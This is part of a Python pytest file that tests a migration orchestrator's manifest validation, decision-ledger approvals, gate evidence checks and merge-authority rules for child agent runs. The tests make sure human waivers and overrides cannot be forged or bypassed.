                   f"| D-3 | default-accepted (soft, 60s) | STOP C wave-2 gates_sha {sha} |\n",  # not a human's row
                   f"| D-3 | user:evt-9 | STOP C wave-2 gates_sha {'b' * 64} |\n",               # another gate list
                   f"| D-3 | user:evt-9 | STOP C wave-2 {sha} |\n",                              # the value without its name
                   f"| D-3 | user:evt-9 | STOP C wave-2 gates_sha {sha}0 |\n",                   # not the exact value
                   f"| user:evt-9 | STOP C wave-2 gates_sha {sha} |\n",                          # no decision id
                   f"| D-4 | user:evt-9 | STOP C wave-2 gates_sha {sha} |\n",                    # not the row the manifest names
                   f"| D-3 | user: | STOP C wave-2 gates_sha {sha} |\n",                         # user: without an id
                   f"| D-3 | user:evt-9 | wave-2 gates_sha {sha} |\n",                           # not a STOP C row
                   f"| D-3 | user:evt-9 | STOP CD wave-2 gates_sha {sha} |\n",
                   f"| D-3 | user:evt-9 | STOP C gates_sha {sha} |\n",                           # no wave
                   f"| D-3 | user:evt-9 | STOP C wave-3 gates_sha {sha} |\n",                    # another wave's approval
                   f"| D-3 | user:evt-9 | STOP C wave-2 gates_sha {sha} approved |\n",           # prose in the approval cell
                   f"| D-3 | user:evt-9 STOP C wave-2 gates_sha {sha} |\n",                      # provenance and approval in one cell
                   f"D-3 user:evt-9 STOP C wave-2 gates_sha {sha}\n",                            # not a table row
                   f"| D-3 | STOP C wave-2 gates_sha {sha} |\n| user:evt-9 |\n",                 # cells on two rows
                   f"| D-3 | see D-3 | STOP C wave-2 gates_sha {sha} |\n",                       # no provenance cell
                   f"| D-3 | D-3 user:evt-9 | STOP C wave-2 gates_sha {sha} |\n"):                # provenance cell is not just the provenance
        assert not gates_approved("D-3", 2, sha, ledger), ledger
    assert not gates_approved(None, 2, sha, row)
    assert not gates_approved("D3", 2, sha, row)
    assert not gates_approved("D-3", "2", sha, row)
    assert not gates_approved("D-3", 2, None, row)
    assert not gates_approved("D-3", 2, sha[:-1], row.replace(sha, sha[:-1]))


def test_a_default_accepted_stop_c_row_approves_the_gates_only_under_soft_stop_mode():
    """STOP C is resolved per stop_mode: soft lets the orchestrator's default-accepted row stand, hard needs
    a human's. The cell is still just the provenance, in the row the manifest names, for this wave."""
    gates_approved = _functions()["gates_approved"]
    sha = "a" * 64
    soft = f"| D-3 | 2024-05-01 | default-accepted (soft, 60s) | STOP C wave-2 gates_sha {sha} |\n"
    human = soft.replace("default-accepted (soft, 60s)", "user:evt-9")
    assert gates_approved("D-3", 2, sha, soft, stop_mode="soft")
    assert gates_approved("D-3", 2, sha, soft.replace(" (soft, 60s)", ""), stop_mode="soft")
    assert gates_approved("D-3", 2, sha, human, stop_mode="soft")
    assert not gates_approved("D-3", 2, sha, soft, stop_mode="hard")
    assert not gates_approved("D-3", 2, sha, soft)
    assert not gates_approved("D-3", 2, sha, soft, stop_mode="open")
    for ledger in (soft.replace("wave-2", "wave-3"),
                   soft.replace("D-3", "D-4"),
                   soft.replace("default-accepted (soft, 60s)", "bot:default-accepted"),
                   soft.replace("default-accepted (soft, 60s)", "default-accepted by D-3"),
                   soft.replace("default-accepted (soft, 60s)", "not default-accepted")):
        assert not gates_approved("D-3", 2, sha, ledger, stop_mode="soft"), ledger


def test_declared_gate_list_is_hashed_into_the_manifest():
    ns = _functions()
    validate_manifest, sha = ns["validate_manifest"], ns["declared_gates_sha"]
    m = _manifest()
    good = m["gates_sha"]
    assert re.fullmatch(r"[0-9a-f]{64}", good)
    validate_manifest(m)
    for missing in ({k: v for k, v in m.items() if k != "gates_sha"}, {**m, "gates_sha": ""}, {**m, "gates_sha": good[:-1] + "0"}):
        with pytest.raises(SystemExit, match="gates_sha") as e:
            validate_manifest(missing)
        assert good in str(e.value) and "STOP C" in str(e.value)
    # the manifest names the STOP C row that approved it
    for bad in ({k: v for k, v in m.items() if k != "stop_c"}, {**m, "stop_c": ""}, {**m, "stop_c": "7"}, {**m, "stop_c": ["D-2"]}):
        with pytest.raises(SystemExit, match="stop_c"):
            validate_manifest(bad)
    # STOP C approved the whole row: a status or evidence edited in the manifest afterwards (a pending gate
    # marked passed by hand) is a plan change, not an outcome; outcomes arrive in the children's reports
    for edited in ([{**b, "gates": [{**g, "status": "passed", "evidence": "x"} for g in b["gates"]]} for b in m["batches"]],
                   [{**b, "gates": [{**g, "evidence": "note.txt"} for g in b["gates"]]} for b in m["batches"]],
                   [{**b, "gates": [{**g, "decision_id": "D-9"} for g in b["gates"]]} for b in m["batches"]]):
        assert sha(m["wave"], edited) != good
        with pytest.raises(SystemExit, match="gates_sha"):
            validate_manifest({**m, "batches": edited})
    # a gate swapped for another kind, renamed, dropped or added is a halt; so is a unit swapped under the gates
    for changed in ([{**b, "gates": [{**g, "kind": "custom"} for g in b["gates"]]} for b in m["batches"]],
                    [{**b, "units": ["other_unit"]} for b in m["batches"]],
                    [{**b, "units": b["units"] + ["extra_unit"]} for b in m["batches"]],
                    [{**b, "gates": [{**g, "id": "g-other"} for g in b["gates"]]} for b in m["batches"]],
                    [{**b, "gates": b["gates"] + [{**GATE, "id": "g-extra"}]} for b in m["batches"]]):
        assert sha(m["wave"], changed) != good
        with pytest.raises(SystemExit, match="gates_sha"):
            validate_manifest({**m, "batches": changed})
    # the same declaration for another wave is another approval
    assert sha(m["wave"] + 1, m["batches"]) != good
    with pytest.raises(SystemExit, match="gates_sha"):
        validate_manifest({**m, "wave": m["wave"] + 1})
    # an absent decision_id and an explicit null hash alike; the hash is over sorted batches and gate order,
    # so re-ordering is not a change
    assert sha(1, [{**b, "gates": [{**g, "decision_id": None} for g in b["gates"]]} for b in m["batches"]]) == good
    assert sha(1, list(reversed(_manifest(batches=[
        {"id": "a", "units": ["u"], "write_targets": ["t"], "brief": "x"},
        {"id": "c", "units": ["v"], "write_targets": ["t2"], "brief": "x"}])["batches"]))) == sha(1, _manifest(batches=[
        {"id": "a", "units": ["u"], "write_targets": ["t"], "brief": "x"},
        {"id": "c", "units": ["v"], "write_targets": ["t2"], "brief": "x"}])["batches"])


GATES_LEDGER = ("| D-12 | user:U1 | waive g-w for u, export leg retired with the legacy feed |\n"
                "| D-13 | user:U1 | waive g-other for u |\n"
                f"| D-2 | user:U0 | STOP C wave-0 gates_sha {'0' * 64} |\n")


def _gate_batch(*gates):
    return {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b", "gates": list(gates)}


def _gate_report(**extra):
    return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
            "pr_url": "https://example/pr/1", "branch": "f", "changed_paths": ["src/a.sql"], "one_line_summary": "ok", **extra}


def _run_gates(batch, report, ledger=GATES_LEDGER):
    ns = _batch_runtime()
    ns["decision_ledger"] = lambda: ledger

    async def agent(prompt, **kwargs):
        return dict(report)

    ns["agent"] = agent
    return asyncio.run(ns["run_batch"](batch, asyncio.Semaphore(1), ns["Breaker"](3)))


def test_pass_with_a_gate_still_pending_is_downgraded():
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report())
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"
    assert "g-rows" in out["one_line_summary"] and "pending" in out["one_line_summary"]
    assert out["gates"] == [{**GATE, "decision_id": None}]


def test_child_reported_gate_pass_with_evidence_in_the_pr_closes_the_gate():
    out = _run_gates(_gate_batch(dict(GATE)),
                     _gate_report(gates=[{"id": "g-rows", "status": "passed", "evidence": ".migration/recon/u/rows.md"}]))
    assert out["status"] == "PASS" and "failure_class" not in out
    assert out["gates"] == [{**GATE, "status": "passed", "evidence": ".migration/recon/u/rows.md", "decision_id": None}]


@pytest.mark.parametrize("reported", [
    [{"id": "g-rows", "status": "passed", "evidence": ""}],                       # no evidence
    [{"id": "g-rows", "status": "passed", "evidence": "rows checked, all good"}],  # a claim, not a file in the PR
    [{"id": "g-rows", "status": "passed", "evidence": "recon/u/rows.md"}],         # not under .migration/recon/<unit>/
    [{"id": "g-rows", "status": "passed", "evidence": ".migration/recon/other_unit/rows.md"}],  # another unit's evidence
    [{"id": "g-rows", "status": "failed", "evidence": "3 rows differ"}],
    [{"id": "g-rows", "status": "waived", "evidence": "", "decision_id": "D-12"}],  # only the ledger waives
    [{"id": "g-rows", "kind": "custom", "status": "passed", "evidence": "x"}],      # kind is not the child's to set
    [{"id": "g-other", "status": "passed", "evidence": "x"}],                     # undeclared gate
    [{"id": "g-rows", "status": "passed", "evidence": "x"}, {"id": "g-rows", "status": "passed", "evidence": "x"}],
    ["g-rows"],
    "g-rows passed",
    [{"status": "passed", "evidence": "x"}],
])
def test_child_cannot_pass_a_gate_without_evidence_waive_it_or_rename_it(reported):
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(gates=reported))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"


def test_a_ledger_waived_gate_needs_nothing_from_the_child_and_cannot_be_flipped_by_it():
    batch = _gate_batch({**GATE, "id": "g-w", "kind": "export_file", "status": "waived", "decision_id": "D-12"})
    out = _run_gates(batch, _gate_report())
    assert out["status"] == "PASS"
    assert [g["status"] for g in out["gates"]] == ["waived"]
    out = _run_gates(batch, _gate_report(gates=[{"id": "g-w", "status": "failed", "evidence": "x"}]))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"


def test_a_plan_passed_gate_is_a_declaration_the_child_still_has_to_prove():
    """passed in the manifest says what STOP C expects, not what happened: without the child's result and its
    evidence at the PR head the gate is unmet, and the child's evidence is what gets recorded."""
    batch = _gate_batch({**GATE, "status": "passed", "evidence": "stop-c/rows.md"})
    out = _run_gates(batch, _gate_report())
    assert out["status"] == "FAIL" and out["failure_class"] == "gates" and "g-rows" in out["one_line_summary"]
    out = _run_gates(batch, _gate_report(gates=[{"id": "g-rows", "status": "passed", "evidence": "stop-c/rows.md"}]))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"
    out = _run_gates(batch, _gate_report(gates=[{"id": "g-rows", "status": "passed", "evidence": ".migration/recon/u/rows.md"}]))
    assert out["status"] == "PASS"
    assert out["gates"] == [{**GATE, "status": "passed", "evidence": ".migration/recon/u/rows.md", "decision_id": None}]
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"]({**ns["MANIFEST"]["batches"][0], "gates": batch["gates"]})
    assert "g-rows" in child


@pytest.mark.parametrize("ledger", [
    "",
    "| D-12 | user: waive g-w for other_unit |\n",                 # names another unit
    "| D-12 | user: waive g-other for u |\n",                      # names another gate
    "| D-120 | user: waive g-w for u |\n",                         # D-12 is not a prefix match
])
def test_waived_gate_whose_decision_is_not_in_the_ledger_fails_closed(ledger):
    batch = _gate_batch({**GATE, "id": "g-w", "kind": "export_file", "status": "waived", "decision_id": "D-12"})
    out = _run_gates(batch, _gate_report(), ledger)
    assert out["status"] == "FAIL" and out["failure_class"] == "gates" and "D-12" in out["one_line_summary"]


def test_a_human_waiver_recorded_after_stop_c_closes_a_declared_gate_the_child_did_not_pass():
    """The declaration is frozen by gates_sha, so a waiver decided after STOP C lives in the ledger alone: a
    human's D-<n> row that says waive and names the gate and every unit stands in for the child's result."""
    ledger = GATES_LEDGER + "| D-14 | user:U2 | waive g-rows for u, parity proven on the wave-1 rerun |\n"
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(), ledger)
    assert out["status"] == "PASS", out.get("one_line_summary")
    assert out["gates"] == [{**GATE, "status": "waived", "decision_id": "D-14"}]
    out = _run_gates(_gate_batch(dict(GATE)),
                     _gate_report(gates=[{"id": "g-rows", "status": "failed", "evidence": "3 rows differ"}]), ledger)
    assert out["status"] == "PASS", out.get("one_line_summary")
    assert out["gates"] == [{**GATE, "status": "waived", "evidence": "3 rows differ", "decision_id": "D-14"}]  # what was waived over stays visible


def test_a_waiver_written_before_this_stop_c_row_does_not_carry_into_the_run_it_approved():
    """A wave rerun fires STOP C again and the manifest names the new row; a waiver a human wrote for the
    earlier run sits above that row and is that run's, so it does not waive the gate here. Only rows
    strictly after the manifest's stop_c row are post-STOP C waivers; no stop_c row, no waiver."""
    ledger_waiver = _batch_runtime()["ledger_waiver"]
    old = "| D-14 | user:U2 | waive g-rows for u |\n"
    stop_c = f"| D-20 | user:U0 | STOP C wave-0 gates_sha {'0' * 64} |\n"
    new = "| D-21 | user:U2 | waive g-rows for u |\n"
    assert ledger_waiver("g-rows", ["u"], old + stop_c + new, "D-20") == "D-21"
    assert ledger_waiver("g-rows", ["u"], old + stop_c, "D-20") is None
    assert ledger_waiver("g-rows", ["u"], old + new, "D-20") is None
    assert ledger_waiver("g-rows", ["u"], old + "| D-19 | user:U0 | STOP C, see D-20 for the hash |\n" + new, "D-20") is None
    assert ledger_waiver("g-rows", ["u"], "| D-20 | user:U2 | STOP C wave-0 gates_sha x; waive g-rows for u |\n", "D-20") is None
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(), old + GATES_LEDGER)
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"
    assert out["gates"] == [{**GATE, "decision_id": None}]
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(), GATES_LEDGER + new.replace("D-21", "D-14"))
    assert out["status"] == "PASS", out.get("one_line_summary")


@pytest.mark.parametrize("row", [
    "| D-14 | default-accepted | waive g-rows for u |\n",   # the orchestrator's row, not a human's
    "| D-14 | user:U2 | waive g-rows for other_unit |\n",
    "| D-14 | user:U2 | waive g-other for u |\n",
    "| D-14 | user:U2 | g-rows for u |\n",
])
def test_a_ledger_row_that_does_not_waive_this_gate_for_every_unit_leaves_it_unmet(row):
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(), GATES_LEDGER + row)
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"
    assert out["gates"] == [{**GATE, "decision_id": None}]


def test_evidence_in_pr_is_a_file_of_the_units_recon_dir_at_the_gated_head(tmp_path):
    ws = tmp_path / "ws"
    ns = _launch_ns(ws)
    (ws / ".migration/recon/u").mkdir(parents=True)
    subprocess.run(["git", "-C", str(ws), "init", "-q"], check=True)
    subprocess.run(["git", "-C", str(ws), "config", "user.name", "t"], check=True)
    subprocess.run(["git", "-C", str(ws), "config", "user.email", "t@example.com"], check=True)
    (ws / ".migration/recon/u/rows.md").write_text("rows\n")
    (ws / ".migration/recon/u/sub").mkdir()
    (ws / ".migration/recon/u/sub/x.md").write_text("x\n")
    (ws / "notes.md").write_text("n\n")
    subprocess.run(["git", "-C", str(ws), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(ws), "commit", "-qm", "evidence"], check=True)
    head = subprocess.run(["git", "-C", str(ws), "rev-parse", "HEAD"], check=True, capture_output=True, text=True).stdout.strip()
    evidence_in_pr = ns["evidence_in_pr"]
    assert evidence_in_pr(head, ".migration/recon/u/rows.md", ["u", "v"])
    assert evidence_in_pr(head, ".migration/recon/u/sub/x.md", ["u"])
    for path in (".migration/recon/u/missing.md",          # not in the PR
                 ".migration/recon/u",                     # a directory, not evidence
                 ".migration/recon/u/",
                 ".migration/recon/v/rows.md",             # v has no such file
                 ".migration/recon/w/rows.md",             # not a unit of the batch
                 ".migration/recon/u/../w/rows.md",
                 "notes.md",
                 "/" + str(ws / ".migration/recon/u/rows.md"),
                 "", None, 3):
        assert not evidence_in_pr(head, path, ["u", "v"]), path
    assert not evidence_in_pr(None, ".migration/recon/u/rows.md", ["u"])
    assert not evidence_in_pr(head[:-1] + ("0" if head[-1] != "0" else "1"), ".migration/recon/u/rows.md", ["u"])


def test_gate_check_runs_last_after_the_pr_gate_and_merge_authority():
    out = _run_gates(_gate_batch(dict(GATE)), {**_gate_report(), "pr_url": ""})
    assert out["failure_class"] == "missing_pr"
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(merge_eligible=False))
    assert out["failure_class"] == "merge_authority"
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report())
    assert out["failure_class"] == "gates"


def test_child_schema_and_prompts_carry_gates():
    tree = ast.parse(WORKFLOW.read_text())
    schema = next(ast.literal_eval(n.value) for n in tree.body
                  if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "CHILD_SCHEMA" for t in n.targets))
    gate = schema["properties"]["gates"]["items"]
    assert gate["properties"]["status"]["enum"] == ["passed", "failed"] and gate["required"] == ["id", "status", "evidence"]
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "g-rows" in child and "row_parity" in child and "waived" in child
    verify = ns["verify_prompt"]([{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1",
                                  "gates": [{**GATE, "status": "passed", "evidence": "recon/u/result.json"}]}], False)
    assert "g-rows" in verify and "recon/u/result.json" in verify


@pytest.mark.parametrize("caps", [
    "sp@x",                                   # not a dict
    {k: v for k, v in CAPS.items() if k != "identity"},
    _caps(identity=""),
    _caps(catalogs=[]),
    _caps(catalogs="mig"),
    _caps(catalogs=["mig", ""]),
    _caps(ready=False),
    {k: v for k, v in CAPS.items() if k != "ready"},
    _caps(ready=None),
    _caps(ready="true"),
    _caps(ready=1),
    {k: v for k, v in CAPS.items() if k != "guard_mode"},
    _caps(guard_mode="off"),
    {k: v for k, v in CAPS.items() if k != "stop_mode"},
    _caps(stop_mode="medium"),
])
def test_validate_manifest_rejects_bad_capability_contract(caps):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="capabilities"):
        validate_manifest(_manifest(capabilities=caps))


def test_validate_manifest_rejects_missing_capabilities():
    validate_manifest = _functions()["validate_manifest"]
    m = _manifest()
    del m["capabilities"]
    with pytest.raises(SystemExit, match="capabilities"):
        validate_manifest(m)


@pytest.mark.parametrize("manifest", [
    _manifest(capabilities=_caps(stop_mode="hard"), auto_merge=True),
    _manifest(auto_merge="false"),
])
def test_validate_manifest_hard_stop_mode_forbids_auto_merge(manifest):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="auto_merge"):
        validate_manifest(manifest)


def test_validate_manifest_accepts_capability_contract():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest())
    validate_manifest(_manifest(auto_merge=True))
    validate_manifest(_manifest(capabilities=_caps(stop_mode="hard", guard_mode="warn"), auto_merge=False))


def test_validate_manifest_allows_serial_wave_zero_only():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(wave=0, width=1))
    with pytest.raises(SystemExit, match="wave 0 is the serial shared-objects wave"):
        validate_manifest(_manifest(wave=0, width=2))


def test_validate_manifest_requires_feature_branch_or_recorded_trunk_decision():
    validate_manifest = _functions()["validate_manifest"]
    missing = _manifest()
    del missing["base_branch"]
    with pytest.raises(SystemExit, match="manifest is missing 'base_branch'"):
        validate_manifest(missing)
    with pytest.raises(SystemExit, match="base_branch 'main' is the trunk"):
        validate_manifest(_manifest(base_branch="main"))
    validate_manifest(_manifest(base_branch="main", trunk_base_decision="D-2026-001"))


def test_child_prompt_embeds_capability_contract():
    ns = _prompt_ns(_manifest())
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--expect-identity sp-1" in text
    assert '"catalogs": ["mig"]' in text
    assert '"guard_mode": "block"' in text and '"stop_mode": "soft"' in text
    assert "BLOCKED" in text


def test_child_prompt_names_exactly_its_batch_units_for_the_doctor():
    # the child preflight covers its whole batch: the brief spells out one --unit per unit it owns,
    # so a shorter list would be a visible deviation, and the doctor resolves the mapping paths
    ns = _prompt_ns(_manifest(batches=[
        {"id": "b", "units": ["loans", "payments"], "write_targets": ["t"], "brief": "brief"},
        {"id": "c", "units": ["fees"], "write_targets": ["t2"], "brief": "brief"},
    ]))
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--role child --expect-identity sp-1 --unit loans --unit payments (exactly this batch" in text
    assert "--unit fees" not in text and "--mapping" not in text
    assert "mapping_spec.json itself" in text


def test_child_brief_pins_the_contracts_workspace_host_for_the_doctor():
    """The expected principal can resolve against another workspace from a child's own profile or env;
    the brief makes the doctor compare the host the contract records, not only the identity."""
    ns = _prompt_ns(_manifest())
    assert f"--expect-host {HOST}" in ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    odd = _prompt_ns(_manifest(capabilities=_caps(host="https://x.net/a b")))
    assert "--expect-host 'https://x.net/a b'" in odd["child_prompt"](odd["MANIFEST"]["batches"][0])


@pytest.mark.parametrize("manifest", [
    _manifest(verify_depth="threshold"),   # verifier depth is a plan decision, never tolerance-driven
    _manifest(verify_depth="deep"),
    _manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief",
                        "verify_depth": "none"}]),
    _manifest(cost_estimate="cheap"),
])
def test_validate_manifest_rejects_bad_depth_or_cost(manifest):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="verify_depth|cost_estimate"):
        validate_manifest(manifest)


def test_validate_manifest_accepts_depth_knob_and_estimate():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(verify_depth="full", cost_estimate={"source_statements": 12}))
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"],
                                          "brief": "brief", "verify_depth": "sampled"}]))


def _prompt_ns(manifest):
    tree = ast.parse(WORKFLOW.read_text())
    names = {"verify_prompt", "batch_verify_depth", "batch_max_minutes", "child_prompt", "capability_block",
             "sum_cost", "cost_line"}
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef) and node.name in names)
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"COST_KEYS", "MERGE_EVIDENCE_MODES"}
                    for t in node.targets))]
    ns = {"json": __import__("json"), "shlex": __import__("shlex"), "WAVE": 1, "TAG": "0",
          "REPO": "repo", "MANIFEST": manifest,
          "BATCHES": manifest["batches"], "VERIFY_DEPTH": manifest.get("verify_depth", "sampled"),
          "MAX_MINUTES": int(manifest.get("max_minutes", 45))}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
    return ns


def test_verifier_prompt_carries_per_batch_depth_defaulting_to_sampled():
    m = _manifest(batches=[
        {"id": "b1", "units": ["u"], "write_targets": ["t1"], "brief": "x"},
        {"id": "b2", "units": ["v"], "write_targets": ["t2"], "brief": "y", "verify_depth": "full"}])
    ns = _prompt_ns(m)
    # the shape main() hands the verifier: {"batch": id, ...}, no verify_depth on the record
    passed = [{"batch": b["id"], "units": b["units"], "pr_url": "", "branch": ""} for b in m["batches"]]
    text = ns["verify_prompt"](passed, True)
    assert '"b1": "sampled"' in text and '"b2": "full"' in text
    assert "--depth" in text and "Never lower" in text and "recon_cost" in text
    ns2 = _prompt_ns(_manifest(verify_depth="full"))
    assert '"b": "full"' in ns2["verify_prompt"]([{"batch": "b", "units": ["u"]}], True)


def test_child_prompt_asks_for_recon_cost():
    ns = _prompt_ns(_manifest())
    assert "recon_cost" in ns["child_prompt"](ns["MANIFEST"]["batches"][0])


def test_cost_line_compares_estimate_with_summed_actuals():
    m = _manifest(cost_estimate={"source_statements": 10, "source_rows_fetched": 1000})
    ns = _prompt_ns(m)
    results = [{"recon_cost": {"source_statements": 4, "target_statements": 2,
                               "source_rows_fetched": 300, "target_rows_fetched": 300, "elapsed_s": 1.2}},
               {"status": "BLOCKED"}]
    verify = {"recon_cost": {"source_statements": 3, "target_statements": None,
                             "source_rows_fetched": 100, "target_rows_fetched": 100, "elapsed_s": 0.8}}
    line = ns["cost_line"](results, verify)
    assert "estimated source_statements=10, source_rows_fetched=1000" in line
    assert "source_statements=7" in line and "source_rows_fetched=400" in line
    assert "target_statements=" not in line.split("actual")[1].split(",")[0]  # None side is omitted
    assert "harness time 2s" in line and "Verifier depth sampled" in line
    assert _prompt_ns(_manifest())["cost_line"]([{"status": "FAIL"}], None).startswith("Cost: no estimate")


def test_replayed_failures_do_not_refill_breaker():
    namespace = _batch_runtime()
    namespace["REPLAYED"] = {f"b{i}": "FAIL" for i in range(3)}

    async def agent(prompt, **kwargs):
        if kwargs["label"] in namespace["REPLAYED"]:
            return {"status": "FAIL", "recon_verdict": "NOT_RUN",
                    "failure_class": "same", "one_line_summary": "replayed"}
        return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
                "pr_url": "https://example/pr/held", "branch": "feature/held",
                "changed_paths": ["src/held.sql"], "one_line_summary": "held passed"}

    namespace["agent"] = agent

    async def exercise():
        breaker = namespace["Breaker"](3)
        sem = asyncio.Semaphore(1)
        outputs = []
        for batch_id in ("b0", "b1", "b2", "b3"):
            outputs.append(await namespace["run_batch"](
                {"id": batch_id, "units": ["u"], "write_targets": ["t"], "brief": "b"},
                sem, breaker))
        return outputs, breaker

    outputs, breaker = asyncio.run(exercise())
    assert outputs[-1]["status"] == "PASS"
    assert breaker.tripped_on is None


def test_pass_without_pr_is_downgraded():
    namespace = _batch_runtime()

    async def agent(prompt, **kwargs):
        return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
                "branch": "feature/no-url", "one_line_summary": "passed"}

    namespace["agent"] = agent

    async def exercise():
        breaker = namespace["Breaker"](3)
        return await namespace["run_batch"](
            {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b"},
            asyncio.Semaphore(1), breaker)

    output = asyncio.run(exercise())
    assert output["status"] == "FAIL"
    assert output["failure_class"] == "missing_pr"


BATCH = {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b"}


def _run_one(namespace, report):
    async def agent(prompt, **kwargs):
        return dict(report)

    namespace["agent"] = agent

    async def exercise():
        return await namespace["run_batch"](
            dict(BATCH),
            asyncio.Semaphore(1), namespace["Breaker"](3))

    return asyncio.run(exercise())


@pytest.mark.parametrize("mode", ["live", "snapshot", "transactional"])
def test_pass_with_merge_evidence_mode_is_kept(mode):
    out = _run_one(_batch_runtime(), {"status": "PASS", "recon_verdict": "PASS", "recon_mode": mode, "merge_eligible": True,
                                      "pr_url": "https://example/pr/1", "branch": "f", "changed_paths": ["src/a.sql"],
                                      "one_line_summary": "ok"})
    assert out["status"] == "PASS" and "failure_class" not in out
    assert out["merge_authority"] == {"kind": "harness", "decision_id": None}


@pytest.mark.parametrize("mode", ["fixture", "continuous", None])
def test_pass_without_merge_evidence_is_downgraded(mode):
    out = _run_one(_batch_runtime(), {"status": "PASS", "recon_verdict": "PASS", "recon_mode": mode, "merge_eligible": True,
                                      "pr_url": "https://example/pr/1", "branch": "f", "one_line_summary": "ok"})
    assert out["status"] == "FAIL" and out["failure_class"] == "non_merge_evidence"


# ---------------------------------------------------------------- merge authority (WS3.2)

LEDGER = ("| D-6 | 2024-05-01 | user:U1 | widen tolerance for orders_dim | \n"
          "| D-7 | 2024-05-02 | user:U1 | merge_override for u, its snapshot watermark mismatch is a known feed gap |\n"
          "| D-8 | 2024-05-02 | default-accepted | merge_override for other_unit |\n"
          "| D-70 | 2024-05-03 | user:U1 | merge_override for u2 |\n")


def _ns_with_ledger(text=LEDGER):
    ns = _batch_runtime()
    ns["decision_ledger"] = lambda: text
    return ns


_pass_nomerge = {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "pr_url": "https://example/pr/1",
                 "branch": "f", "changed_paths": ["src/a.sql"], "one_line_summary": "ok"}


@pytest.mark.parametrize("report", [
    _pass_nomerge,
    {**_pass_nomerge, "merge_eligible": False},
    {**_pass_nomerge, "merge_eligible": "true"},
    {**_pass_nomerge, "merge_eligible": 1},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "harness", "decision_id": "D-7"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "D-6"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "D-8"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "D-9"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "7"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": "D-7"},
])
def test_pass_without_merge_eligible_true_needs_a_ledger_override(report):
    out = _run_one(_ns_with_ledger(), report)
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority"
    assert "merge_override" in out["one_line_summary"] and out["one_line_summary"].startswith("PASS downgraded")
    assert "merge_authority" not in out or out["merge_authority"]["kind"] != "human_override"


def test_human_override_recorded_in_the_ledger_for_the_unit_keeps_the_pass():
    out = _run_one(_ns_with_ledger(), {**_pass_nomerge, "merge_eligible": False,
                                       "merge_authority": {"kind": "human_override", "decision_id": "D-7"}})
    assert out["status"] == "PASS" and "failure_class" not in out
    assert out["merge_authority"] == {"kind": "human_override", "decision_id": "D-7"}


def test_override_does_not_bypass_the_merge_evidence_mode_gate():
    out = _run_one(_ns_with_ledger(), {**_pass_nomerge, "recon_mode": "fixture", "merge_eligible": False,
                                       "merge_authority": {"kind": "human_override", "decision_id": "D-7"}})
    assert out["status"] == "FAIL" and out["failure_class"] == "non_merge_evidence"


def test_override_with_no_ledger_file_fails_closed():
    out = _run_one(_ns_with_ledger(""), {**_pass_nomerge, "merge_eligible": False,
                                         "merge_authority": {"kind": "human_override", "decision_id": "D-7"}})
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority"


def test_override_decision_row_must_name_every_unit_and_say_merge_override():
    override_decision = _batch_runtime()["override_decision"]
    assert override_decision("D-7", ["u"], LEDGER)
    assert not override_decision("D-7", ["u", "u2"], LEDGER)
    assert not override_decision("D-7", ["u"], LEDGER.replace("merge_override", "merge override"))
    assert not override_decision("D-70", ["u"], LEDGER)      # D-70 names u2, not u
    assert not override_decision("D-7", ["u2"], LEDGER)      # D-7 is not a prefix match for D-70
    assert override_decision("D-70", ["u2"], LEDGER)
    assert not override_decision("D-7", ["orders"], "D-7 merge_override for orders_dim")
    assert not override_decision(None, ["u"], LEDGER) and not override_decision("D-", ["u"], LEDGER)


